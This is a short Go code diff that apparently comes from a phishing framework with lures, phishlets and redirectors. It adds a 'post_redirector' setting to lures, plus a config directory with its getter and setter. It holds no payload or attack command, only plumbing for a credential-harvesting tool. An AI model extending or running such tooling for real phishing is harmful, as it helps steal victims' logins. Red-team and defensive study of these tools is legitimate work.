@@ -24,6 +24,7 @@ type Lure struct {
 	RedirectUrl     string `mapstructure:"redirect_url" json:"redirect_url" yaml:"redirect_url"`
 	Phishlet        string `mapstructure:"phishlet" json:"phishlet" yaml:"phishlet"`
 	Redirector      string `mapstructure:"redirector" json:"redirector" yaml:"redirector"`
+	PostRedirector  string `mapstructure:"post_redirector" json:"post_redirector" yaml:"post_redirector"`
 	UserAgentFilter string `mapstructure:"ua_filter" json:"ua_filter" yaml:"ua_filter"`
 	Info            string `mapstructure:"info" json:"info" yaml:"info"`
 	OgTitle         string `mapstructure:"og_title" json:"og_title" yaml:"og_title"`
@@ -158,6 +159,7 @@ type Config struct {
 	phishletNames          []string
 	activeHostnames        []string
 	redirectorsDir         string
+	postRedirectorsDir     string
 	lures                  []*Lure
 	lureIds                []string
 	subphishlets           []*SubPhishlet
@@ -683,6 +685,10 @@ func (c *Config) SetRedirectorsDir(path string) {
 	c.redirectorsDir = path
 }
 
+func (c *Config) SetPostRedirectorsDir(path string) {
+	c.postRedirectorsDir = path
+}
+
 func (c *Config) ResetAllSites() {
 	c.phishletConfig = make(map[string]*PhishletConfig)
 	c.SavePhishlets()
@@ -1055,6 +1061,10 @@ func (c *Config) GetHttpPort() int {
 
 func (c *Config) GetRedirectorsDir() string {
 	return c.redirectorsDir
+}
+
+func (c *Config) GetPostRedirectorsDir() string {
+	return c.postRedirectorsDir
 }
 
 func (c *Config) GetWebAdminPort() int {
